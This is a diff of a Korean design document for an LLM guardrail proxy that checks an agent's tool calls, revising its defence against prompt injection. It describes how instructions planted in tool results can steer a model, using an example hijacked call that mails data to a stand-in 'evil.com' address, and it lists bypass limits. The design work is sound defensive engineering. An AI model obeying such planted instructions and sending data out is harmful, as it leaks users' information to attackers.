@@ -147,9 +147,13 @@ Guardrail          노드 그래프 1개. 이름 + 버전. 요청이 지정하�
                    React Flow 캔버스 1개에 대응.
 
 Node               그래프 구성 요소
-                     Extract    무엇을 볼지 (input / tool_result / output / tool_call)
+                     Extract    무엇을 언제 볼지
+                                extract(from: user_text | tool_result | trusted_text | output_text,
+                                        at: input | tool_result | output | tool_call)
+                                tool_extract(tools: exclude | include,
+                                             field: name | arguments | path) — at=tool_call
                      Transform  입력을 다듬기 (lower / strip)
-                     Check      조건을 확인하기 (regex / model / taint / side_effect / provenance)
+                     Check      조건을 확인하기 (regex / model / not)
                      Verdict    결론 (block / allow / ask / mask) + 입력 조합 (any / all)
 
 SharedNode         노드 라이브러리. 여러 Guardrail이 참조하는 재사용 단위.
@@ -490,23 +494,30 @@ OpenAI 프로토콜은 매 턴 `messages` 배열 전체를 다시 보낸다. 따
 > (헤더 vs 별도 엔드포인트), 만료 처리, 인수 매칭 정책, 클라이언트 라이브러리 API가
 > 미확정이다. v1 범위에 포함할지도 이 설계 후에 결정한다.
 
-### 7.6 툴 등록은 게이트웨이 쪽에 둔다
+### 7.6 툴 선택은 안전한 기본값을 구조로 보장한다
 
-"어떤 툴이 바깥에 영향을 주나"를 앱이 신고하게 하면 안 된다. 공격 대상이 앱인데 앱에게
-묻는 셈이고, 앱 개발자가 실수로 `send_email`을 읽기 전용으로 표시하면 방어가 사라진다.
+"어떤 툴을 액션 검사할지"는 정책 UI에서 보안 담당자가 `tool_extract.tools`로
+설정한다. 앱이 자신을 읽기 전용이라고 신고하는 헤더는 만들지 않는다. 공격 대상이 앱인데
+앱의 신고 하나로 방어가 사라지면 안 된다.
 
 ```
-툴 등록 (정책 UI, 보안 담당자가 설정)
+tool_extract(
+  tools: {exclude: [read_file, web_search]},   # 기본 모드
+  field: name,
+)
 
-  read_file      읽기 전용    ✅
-  web_search     읽기 전용    ✅
-  send_email     부작용 있음  ⚠️   ← 오염 후 통제 대상
-  write_file     부작용 있음  ⚠️
-  <미등록 툴>    부작용 있음  ⚠️   ← 기본값을 안전한 쪽으로
+read_file      제외 → 이 정책은 미실행
+web_search     제외 → 이 정책은 미실행
+send_email     선택 → 검사
+write_file     선택 → 검사
+<새 툴>         선택 → 검사
+<이름 못 읽음>  선택 → 검사
 ```
 
-미등록 툴을 "부작용 있음"으로 기본 처리하는 것이 중요하다. 새 툴이 추가됐을 때 조용히
-방어가 비는 것을 막는다.
+`tools` 를 생략하면 `{exclude: []}`다. 그래서 새 툴이 추가돼도 조용히 검사에서 빠지지
+않는다. `{include: [...]}`는 특정 툴만 보는 정책이 필요할 때 명시적으로 선택한다. 이름을
+못 읽은 호출은 두 모드 모두에서 선택된 것으로 처리한다. 선택되지 않은 호출은 그 호출에
+대해 프로그램을 실행하지 않는다.
 
 ### 7.7 채택을 위한 얇은 클라이언트
 
@@ -559,68 +570,78 @@ LLM은 이를 데이터가 아니라 **지시로** 받아들인다.
 
 ### 방어 3단계
 
-**1단계 — 오염 표시 (taint).** `role:tool` 메시지를 볼 때마다 기록한다. 막지 않는다.
+**1단계 — 툴 결과 이력을 ④에서 읽는다.** 특수 taint 상태를 두지 않고 출처와
+평가 시점을 나눈다.
 
 ```
-turn 1   사용자 질문                  ✅ 깨끗함
-turn 2   read_file 결과 도착           ⚠️ 오염됨
-turn 3   ...                          ⚠️ 계속 오염 (되돌아가지 않음)
+extract(from: tool_result, at: tool_call) → regex(".")
+
+turn 1   사용자 질문                  tool_result 텍스트 없음
+turn 2   read_file 결과 도착           tool_result 텍스트 있음
+turn 3   messages 이력에 결과 유지    계속 참
 ```
 
-**2단계 — 오염 후 부작용 툴 통제.**
+**2단계 — 툴 결과 이력 후 선택된 툴 통제.** 읽기 전용 목록은 `exclude`로 두어 새
+툴이 기본으로 검사되게 한다.
 
 ```
-send_email 호출 시도
-     ├─ 대화가 깨끗함  ──▶ 통과
-     └─ 오염됨        ──▶ 차단 또는 승인 요구
+extract(from: tool_result, at: tool_call) → regex(".") ─┐
+                                                               ├→ verdict(all, block)
+tool_extract(exclude: [read_file, web_search], field: name)      │
+                                              → regex(".") ─┘
 ```
 
 **승인 요구가 실무의 정답인 경우가 많다.** 그냥 막으면 "파일 읽고 요약해서 팀에 메일
 보내줘"라는 완전히 정당한 요청도 막힌다 (false-positive tax). 확인 한 번 받으면 정상
 업무는 통과하고 공격은 사용자 눈에 드러난다.
 
-**3단계 — 인수 출처 검사.**
+**3단계 — 인수 내용과 허용 범위 검사.** `tool_extract` 로 인수 전체 또는 특정 경로를
+뽑아 일반 regex/model Check에 넣는다.
 
 ```
 send_email(to = "audit-team@evil.com")
                     │
-   사용자 메시지에 있나?    없음
-   시스템 프롬프트에 있나?  없음
-   방금 읽은 파일에 있나?   ★ 있음
+tool_extract(include: [send_email], field: "to")
+                    │
+       regex("@company\\.com$") → NOT
                     ▼
-   사용자가 말한 적 없는 주소가 외부 파일에서 나왔다
-   = 데이터가 지시로 바뀐 증거 → 차단
+       사내 도메인이 아님 → 차단
 ```
 
-실전에서 통하는 이유: **공격자는 목적지를 반드시 적어야 한다.** 메일 주소·URL·파일 경로를
-툴 결과 안에 써놓지 않으면 공격이 성립하지 않는다. 정상적인 경우엔 그 값이 사용자
-메시지나 시스템 프롬프트에서 온다. **출처가 다르다.**
+공격자는 메일 주소·URL·파일 경로 같은 목적지를 반드시 인수에 넣어야 한다. 열거 가능한
+값은 허용목록 regex + `NOT`으로 제한하면 공격자가 툴 결과에 무엇을 심어도 허용 범위 밖으로
+나가지 못한다. 인수 전체의 주민등록번호·크레덴셜 패턴도 같은 문법으로 검사한다.
+
+기존 `provenance`(인수 값이 툴 결과 문자열에 그대로 있는지)는 제거했다. 런타임 값 두 개를 비교하는
+이항 Check라 일반 단항 Check 문법으로 표현되지 않고, 문자열 일치 근사를 정확한 출처 추적으로 과신할
+위험이 있다. 대체는 ① 열거 가능한 값의 allowlist regex + `NOT`, ② Phase 6의 명시적 승인이다.
+임의 URL·경로의 런타임 출처 비교가 정말 필요해지면 이항 Check `contains(A, B)`를 별도 설계한다.
 
 ### 한계 (명시)
 
 - 프록시는 모델 내부를 못 본다. 데이터가 모델 안에서 어떻게 흘렀는지 추적 불가.
-- 3단계는 "문자열이 그대로 나타나는지" 보는 근사법이다. base64·철자 쪼개기 등으로
-  변형하면 우회 가능.
-- 1·2단계는 우회가 어렵다. 오염 여부와 툴 종류는 문자열 게임이 아니라 **구조적 사실**이다.
-  어떻게 인코딩해도 "외부 데이터가 들어왔다"와 "발송 툴을 부르려 한다"는 바뀌지 않는다.
+- allowlist로 열거하기 어려운 임의 URL·파일 경로는 승인 흐름 또는 향후 이항 Check가 필요하다.
+- 1·2단계는 요청의 `role:tool` 이력과 구조화된 tool_call 을 각각 읽는다. 텍스트 내용을
+  인코딩해도 "툴 결과가 들어왔다"와 "어떤 툴을 부르려 한다"는 구조는 바뀌지 않는다.
 - 완전한 방어(CaMeL)는 LLM을 감싸는 전용 인터프리터가 필요하고 프록시 자리에서는 불가능.
   대가로 "앱 코드 한 줄 안 바꾸고 적용된다"를 얻는다.
 
 
-**런타임 검증 (2026-08-24).** ②④ 를 실제 스택으로 확인했다 — uvicorn + Postgres/Redis/ClickHouse,
-업스트림 tool_calls 응답을 통제해 주입. 오염(role:tool)이 부작용 툴을 호출하면 차단, read-only
-툴이거나 비오염이면 통과:
+**런타임 검증 (2026-08-24, 재설계 2026-08-28).** ②④ 를 실제 스택으로 확인했다 —
+uvicorn + Postgres/Redis/ClickHouse, 업스트림 tool_calls 응답을 통제해 주입. 2026-08-28에는
+복제 DB에 특수 노드 변환 migration을 적용한 뒤 default v5의 기존 판정과 인수 값 검사를
+다시 확인했다:
 
 | 시나리오 | 결과 |
 |---|---|
 | 오염 + `send_email`(부작용) | blocked · finish_reason=content_filter · checkpoint=tool_call |
 | 오염 + `read_file`(read-only) | allow (tool_calls 유지) |
 | 비오염 + `send_email` | allow |
-| provenance + 외부 데이터 인수 | blocked (arguments=["to"]) |
+| `tool_extract(field: arguments)` + 주민등록번호 | blocked (arguments=["body"]) |
 
-감사 행이 각 케이스의 action·checkpoint·tainted 를 기록한다. `is_tainted` 가 role:tool 을 오염으로
-잡고, taint와 side_effect(read_only)를 직접 받는 `verdict(combine=all, action=block)` 프로그램이
-tool_call 체크포인트에서 실행된다.
+감사 행이 각 케이스의 action·checkpoint·tainted 를 기록한다. `tainted` 감사 열은 요청의
+role:tool 구조를 계속 기록하고, 판정 프로그램은 `extract`·`tool_extract`·`regex`·`verdict`의
+일반 명령으로 tool_call 체크포인트에서 실행된다.
 ---
 
 ## 9. 스트리밍
